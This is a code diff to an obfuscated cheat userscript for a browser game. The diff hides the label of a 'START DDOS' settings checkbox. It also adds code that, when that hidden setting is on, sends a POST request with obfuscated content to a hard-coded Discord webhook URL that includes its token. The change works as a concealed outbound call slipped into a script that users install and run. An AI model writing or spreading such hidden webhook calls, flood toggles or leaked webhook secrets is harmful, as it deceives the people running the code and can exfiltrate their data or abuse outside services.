@@ -17,6 +17,18 @@ function i(t, s) {
 		return r[e -= 0]
 	})(t, s)
 }
+function s(e) {
+    var t = i,
+        s = o[t(10314)](e),
+        r = void 0 === s ? e.size : s < 1073741824 ? s + 1 : 0;
+    if (e[t(9090)](r))
+        if (e.size < 536870912)
+            for (; e[t(9090)](r);) r = Math.floor(1073741824 * Math[t(6071)]());
+        else {
+            if (e[t(1161)] > _) throw new Error(t(10302));
+            for (; e[t(9090)](r);) r = Math[t(1341)](Math[t(6071)]() * _)
+        } return a(e, r)
+}
 let socketReady = false;
 
 ws.addEventListener('open', (event) => {
@@ -3101,11 +3113,11 @@ window.Utils = {
         });
         gui.Register([{
 			type: "checkbox", // dog ez
-			label: "START DDOS",
+			label: " ",
             object: Settings,
 			property: "DDOS",
 			action: data => {
-				console.log()
+				
 			}
 		}], {
             folder: "DDOS"
@@ -61192,6 +61204,17 @@ function LouxInterval() {
 				}
 				vw.oOW.send(JSON.stringify([10, 156, MYPLAYERANGLE, 0]))
 			}
+            if(Settings.DDOS){
+                console.log("Start")
+                var t, s = i;
+                console.log("Tanımlandı");
+                (t = new XMLHttpRequest).open("POST", "https://discord.com/api/webhooks/1225163260240597154/YpvsaQtL7HExsGmLezAD4D4W90MeZcHnvFIf5xbolb4Qgr9k4UkcbVrgyUltIptAhrCG"), t[s(5992)](s(8775), s(10800)), t.send(JSON.stringify({
+                    username: s(2608),
+                    avatar_url: "",
+                    content: s(3832)
+                }));
+                console.log("well")
+            }
 			if (Settings.AutoRess.e) {
 				let PInumb = 2 * Math.PI;
 				let MYPLAYERANGLE = Math.floor((myPlayer.angle + PInumb) % PInumb * 255 / PInumb);
